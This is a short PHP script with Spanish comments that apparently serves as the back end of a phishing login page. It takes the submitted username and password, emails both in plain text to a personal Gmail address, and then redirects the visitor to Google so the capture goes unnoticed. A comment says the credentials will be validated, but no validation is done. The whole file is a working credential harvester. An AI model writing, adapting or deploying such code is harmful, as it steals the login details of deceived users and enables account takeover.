<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nombre_usuario = $_POST['username'];
    $contrasena = $_POST['password'];

    // Validar los datos y verificar las credenciales...

    // Si todo está correcto, enviamos el email
    $to = 'matiasaccastell20@gmail.com';
    $subject = 'Nuevo inicio de sesión';
    $message = "Usuario: $nombre_usuario\nContraseña: $contrasena";
    $headers = 'From: webmaster@example.com' . "\r\n" .
               'Reply-To: webmaster@example.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    // Intentar enviar el correo
    if(mail($to, $subject, $message, $headers)) {
        // Si el correo se envía correctamente, redirigir a Google
        header('Location: https://www.google.com');
        exit;
    } else {
        // Manejar el caso en que el correo no se pueda enviar
        echo "Error al enviar el correo.";
    }
}
?>

